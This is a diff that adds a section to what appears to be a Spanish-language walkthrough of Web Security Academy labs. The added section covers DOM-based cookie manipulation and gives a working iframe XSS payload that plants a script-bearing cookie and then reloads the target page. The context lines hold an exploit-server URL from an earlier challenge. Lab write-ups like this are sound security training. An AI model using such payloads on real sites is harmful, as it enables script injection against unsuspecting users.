@@ -60,3 +60,11 @@ Para explotar el fallo, construimos una URL que apunta al sitio vulnerable inclu
 ```http
 https://0aa800200443f2df80d1b78b007a0078.web-security-academy.net/post?postId=10&url=https://exploit-0a8000cb04f7f2df80c1b62001860024.exploit-server.net/
 ```
+
+## Reto 5:Manipulación de cookies basada en DOM
+
+Este laboratorio demuestra la manipulación de cookies del lado del cliente basada en DOM. Para resolver este laboratorio, inyecte una cookie que cause un XSS en una página diferente y llame a la print()Función. Necesitará usar el servidor de exploits para dirigir a la víctima a las páginas correctas. 
+
+```html
+<iframe src="https://0a6500a00473d2f780d826bc00f800ab.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a6500a00473d2f780d826bc00f800ab.web-security-academy.net';window.x=1;">
+```
